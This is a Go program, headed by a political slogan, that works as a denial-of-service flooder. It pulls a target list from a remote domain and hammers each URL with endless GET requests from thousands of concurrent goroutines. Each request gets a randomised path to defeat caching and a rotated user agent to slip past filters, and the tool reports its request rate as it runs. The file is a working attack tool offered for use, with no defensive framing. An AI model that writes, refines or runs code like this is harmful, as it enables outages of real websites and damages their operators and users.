// Taiwan stand with Israel
package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/big"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

type Result struct {
	URLs []string `json:"targets"`
}

type UserAgent struct {
	UserAgent string `json:"USER_AGENT"`
}

var MaxGoroutines = 5000

func main() {
	args := os.Args
	if len(args) > 1 {
		maxGoroutines, err := strconv.Atoi(args[1])
		if err != nil {
			fmt.Println("Invalid number of max goroutines, using default:", MaxGoroutines)
		} else {
			MaxGoroutines = maxGoroutines
			fmt.Println("thread set to:", MaxGoroutines)
		}
	}

		// Attempt to fetch content from "https://fuck-hamas.com/targets.json"
	content, err := fetchContent("https://fuck-hamas.com/targets.json")
	if err != nil {
		fmt.Println("Error fetching content from https://fuck-hamas.com/targets.json. Using local targets.json")
		content, err = ioutil.ReadFile("targets.json")
		if err != nil {
			panic(err)
		}
	}
	
	fmt.Println("Using remote targets.json")

	var result Result
	err = json.Unmarshal(content, &result)
	if err != nil {
		panic(err)
	}

	content, err = ioutil.ReadFile("user_agents.json")
	if err != nil {
		panic(err)
	}

	var userAgents []UserAgent
	json.Unmarshal(content, &userAgents)

	client := &http.Client{
		Timeout: time.Second * 10,
	}

	semaphore := make(chan struct{}, MaxGoroutines)

	var counter uint64
	go func() {
		for {
			time.Sleep(time.Second)
			count := atomic.SwapUint64(&counter, 0)
			fmt.Println("Requests per second:", count)
		}
	}()

	for {
		for _, url := range result.URLs {
			semaphore <- struct{}{}
			go func(url string) {
				defer func() { <-semaphore }()

				randomURL := generateRandomURL(url)
				req, err := http.NewRequest("GET", randomURL, nil)
				if err != nil {
					return
				}

				index, err := rand.Int(rand.Reader, big.NewInt(int64(len(userAgents))))
				if err != nil {
					return
				}

				req.Header.Set("User-Agent", userAgents[index.Int64()].UserAgent)

				_, err = client.Do(req)
				if err != nil {
					return
				}
				atomic.AddUint64(&counter, 1)
			}(url)
		}
	}
}

func generateRandomURL(url string) string {
	return strings.Replace(url, "R4ND0M", randomHex(10), -1)
}

func randomHex(n int) string {
	bytes := make([]byte, n)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}
